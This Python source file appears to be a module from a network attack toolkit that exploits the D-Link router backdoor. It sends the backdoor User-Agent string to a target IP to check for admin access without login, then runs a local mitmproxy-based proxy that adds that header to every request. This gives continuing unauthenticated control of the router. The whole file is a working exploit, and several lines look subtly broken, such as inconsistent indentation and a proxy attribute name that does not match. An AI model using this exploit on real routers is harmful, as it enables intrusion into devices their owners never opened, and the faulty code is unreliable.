from ..router_vuln import RouterVuln
from libmproxy import controller, proxy, platform
from threading import Thread
from zoption import Zoption
import urllib2
import util


class dlink_backdoor(RouterVuln):
    """ Checks router to see if it is vunerable to the D-Link backdoor 
    """
    def __init__(self):
        super(dlink_backdoor, self).__init__("D-Link Backdoor")
        self.proxy_server = None
        self.config.update({"target_ip":Zoption(type = "ip",
                                               value = None,
                                            required = True,
                                             display = "Target IP address"),
                            "local_port":Zoption(type = "port",
                                                value = "2020",
                                                required = False,
                                                display = "Local port to open proxy on")
                            })
        self.dlinkproxy = None
        self.proxyserver = None
        self.info = """
        D-Link have serverl vulnerable firmware versions in their routers
        due to a discovered backdoor. The backdoor checks for a specific
        User-Agent string and allows an attacker to gain access to the
        admin menu without logging in.

        Further Reading:
        http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/

        This module will check the target to see if the User-Agent string
        allows bypassing directly to the admin menu. If so, the module will
        start a local proxy with the User-Agent automatically applied."""

    def initialize(self):
        self.running = True
        util.Msg('Checking to see if target is vulnerable...')

        url = 'http://' + self.config["target_ip"].value
        headers = { 'User-Agent' : 'xmlset_roodkcableoj28840ybtide'}
        request = urllib2.Request(url, None, headers)
        response = None
        vuln = None
        result = ""
        try:
            response = urllib2.urlopen(request)
        except urllib2.HTTPError as e:
            result = e.reason
        finally:
            if result is "":
                result = response.getcode()

            if "Unauth" in result:
                vuln = False
                util.Msg("Target is not vulnerable")
                self.shutdown()
            elif "200" in result:
                vuln = True
                util.Msg('Vulnerable! Creating proxy...')
            else:
                util.Msg("Status codes 401 or 200 not present")
                util.Msg("Error:" + result)
                self.shutdown()

        if vuln:
            util.Msg('Creating proxy...')
            config = proxy.ProxyConfig(transparent_proxy=dict(
                                                resolver = platform.resolver(),
                                                sslports = [443]))
            config.skip_cert_cleanup = False
            self.proxy_server = proxy.ProxyServer(config,
                                    int(self.config["local_port"].value))
            self.dlinkproxy = DlinkProxy(self.proxy_server)

            thread = Thread(target=self.dlinkproxy.run)
            thread.start()
	    return True
       else:
           return False

    def shutdown(self):
        """ Shuts down the module safely
            If proxy server is running, shut it down too
        """
        self.running = False
        if self.proxyserver is not None:
            self.proxyserver.shutdown()
        util.Msg("Shutting down D-Link Module")


    def session_view(self):
        """ Return the host targeted, and local proxy
        """
        return self.config["local_port"].value + '->' + \
               self.config["target_ip"].value

class DlinkProxy(controller.Master):
    """ Request handler for libmproxy; takes care of our
        replaces.
    """
    def __init__(self, server):
        controller.Master.__init__(self, server)

    def run(self):
        try:
            return controller.Master.run(self)
        except:
            self.shutdown()

    def handle_request(self, msg):
        msg.headers["User-Agent"] = "xmlset_roodkcableoj28840ybtide"
        msg.reply()

